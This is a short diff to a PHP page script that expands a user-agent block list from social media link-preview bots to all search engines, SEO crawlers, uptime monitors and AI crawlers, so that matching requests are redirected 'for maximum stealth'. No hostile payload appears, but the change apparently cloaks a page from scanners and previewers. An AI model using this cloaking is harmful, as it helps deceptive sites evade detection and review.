@@ -35,12 +35,21 @@ $MAX_RETRIES = 3;
 // ANTI-CRAWLING: Immediate bot detection for obvious social media crawlers only
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $obviousBots = [
+    // Social media crawlers
     'TelegramBot', 'facebookexternalhit', 'Twitterbot', 'WhatsApp',
-    'LinkedInBot', 'SkypeUriPreview', 'SlackBot', 'DiscordBot'
-    // Note: Removed 'applebot', 'googlebot', etc. as they might match legitimate browsers
+    'LinkedInBot', 'SkypeUriPreview', 'SlackBot', 'DiscordBot',
+    
+    // Search engines (block ALL search engine crawling)
+    'Googlebot', 'Bingbot', 'Slurp', 'YahooSeeker', 'DuckDuckBot',
+    'Baiduspider', 'YandexBot', 'SogouSpider', 'facebot', 'ia_archiver',
+    
+    // Other known crawlers and bots
+    'MJ12bot', 'DotBot', 'AhrefsBot', 'SemrushBot', 'MajesticSEO',
+    'BLEXBot', 'UptimeRobot', 'StatusCake', 'GTmetrix', 'PageSpeed',
+    'applebot', 'CCBot', 'ChatGPT', 'GPTBot', 'Claude-Web'
 ];
 
-// Only block obvious social media crawlers, not search engines
+// Block ALL known crawlers, bots, and search engines for maximum stealth
 foreach ($obviousBots as $bot) {
     if (stripos($userAgent, $bot) !== false) {
         // Immediate redirect for social media crawlers
